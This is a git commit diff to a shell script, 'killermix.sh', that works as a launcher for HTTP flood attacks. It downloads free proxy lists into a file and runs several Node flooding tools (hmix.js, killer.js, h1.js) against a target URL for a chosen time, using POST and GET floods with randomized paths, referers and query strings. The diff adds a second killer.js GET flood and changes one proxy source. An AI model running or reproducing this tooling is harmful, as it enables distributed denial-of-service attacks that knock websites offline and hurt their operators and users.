6134f27ba6156069b090449b7384899fee1161c5
hackerlove123 <149338972+hackerlove123@users.noreply.github.com>
2025-04-15 17:55:52 +0700

    her

--- killermix.sh
+++ killermix.sh
@@ -10,15 +10,16 @@ TIME=$2
 > live.txt
 for type in http https; do
 curl -s "https://raw.githubusercontent.com/SoliSpirit/proxy-list/refs/heads/main/Countries/${type}/Vietnam.txt" >> live.txt
-curl -s "https://cc.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&country=all&ssl=all&anonymity=all&timeout=1000&protocol=${type}" >> live.txt
+curl -s "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&country=all&ssl=all&anonymity=all&timeout=1000&protocol=${type}" >> live.txt
 done
 
 # Chạy các script node
 node hmix.js -m POST -u $URL -s $TIME -p live.txt -t 1 --full true -d false &
 node killer.js POST $URL $TIME 1 1 live.txt --query 1 --referer rand --http mix --close --randpath --parsed --reset &
+node killer.js GET $URL $TIME 1 1 live.txt --query 1 --referer rand --http mix --close --randpath --parsed --reset &
 node h1.js POST $URL live.txt $TIME 999 10 randomstring=true &
 node h1.js GET $URL live.txt $TIME 999 10 randomstring=true &
 
 # Dừng toàn bộ sau khi chạy xong TIME giây
 sleep $TIME
-pkill -f "hmix.js|h1.js|h1h2.js|http2.js|h1version.js|killer.js"
+pkill -f "hmix.js|h1.js|h2.js|killer.js|http1.js|http2.js"
